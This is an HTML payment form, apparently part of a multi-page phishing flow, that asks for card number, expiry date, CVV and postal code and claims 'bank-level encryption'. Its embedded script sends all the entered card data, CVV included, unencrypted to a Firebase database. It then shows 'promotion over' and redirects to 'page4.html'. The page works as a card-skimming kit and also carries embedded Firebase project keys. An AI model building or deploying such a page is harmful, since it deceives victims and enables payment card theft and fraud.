<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f8f9fa;
            margin: 0;
        }

        .form-container {
            background: white;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 25px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 360px;
        }

        .form-container input {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
            color: #495057;
        }

        .form-container input::placeholder {
            color: #adb5bd;
        }

        .form-container label {
            font-size: 14px;
            margin-bottom: 8px;
            display: block;
            color: #495057;
            font-weight: bold;
        }

        .form-container .row {
            display: flex;
            gap: 10px;
        }

        .form-container .row input {
            flex: 1;
        }

        .form-container .add-card {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .form-container .add-card:hover {
            background-color: #0056b3;
        }

        .form-container .info {
            font-size: 12px;
            color: #6c757d;
            text-align: center;
            margin-top: 15px;
        }

        .form-container .info .icon {
            color: #28a745;
            margin-right: 5px;
        }

        .form-container .form-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .form-container .form-header h1 {
            font-size: 20px;
            color: #343a40;
            margin: 0;
        }

        .form-container .form-header p {
            font-size: 14px;
            color: #6c757d;
            margin: 5px 0 0;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="form-header">
            <h1>Payment Method</h1>
        </div>

        <label for="card-number">Card Number</label>
        <input type="text" id="card-number" placeholder="1234 5678 9012 3456">

        <div class="row">
            <div>
                <label for="expiration-date">Expiration Date</label>
                <input type="text" id="expiration-date" placeholder="MM/YY">
            </div>
            <div>
                <label for="cvv">Security Code (CVV)</label>
                <input type="text" id="cvv" placeholder="123">
            </div>
        </div>

        <label for="zip">Zip/Postal Code</label>
        <input type="text" id="zip" placeholder="12345 or A1A 1A1">

        <label for="nickname">Nickname (optional)</label>
        <input type="text" id="nickname" placeholder="My Visa Card">

        <button class="add-card" id="add-card-btn">Add Card</button>

        <div class="info">
            <span class="icon">ðŸ”’</span>
            Your payment information is protected with bank-level encryption.
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyABl8Z0JMmmXYuUNHL5Mti_ClO_RVB0S30",
            authDomain: "trial-4c8f7.firebaseapp.com",
            projectId: "trial-4c8f7",
            storageBucket: "trial-4c8f7.appspot.com",
            messagingSenderId: "382152171917",
            appId: "1:382152171917:web:37fedb19f6982b6a259dc4",
            measurementId: "G-CFWF5QW7DS"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Handle "Add Card" button click
        document.getElementById('add-card-btn').addEventListener('click', () => {
            const cardNumber = document.getElementById('card-number').value;
            const expirationDate = document.getElementById('expiration-date').value;
            const cvv = document.getElementById('cvv').value;
            const zip = document.getElementById('zip').value;
            const nickname = document.getElementById('nickname').value;

            // Save data to Firebase
            const cardId = `card_${Date.now()}`; // Unique ID for each card entry
            set(ref(db, 'cards/' + cardId), {
                cardNumber,
                expirationDate,
                cvv,
                zip,
                nickname
            }).then(() => {
                alert('promotion over');
                window.location.href = 'page4.html';
            }).catch((error) => {
                console.error('promotion over', error);
            });
        });
    </script>
</body>
</html>
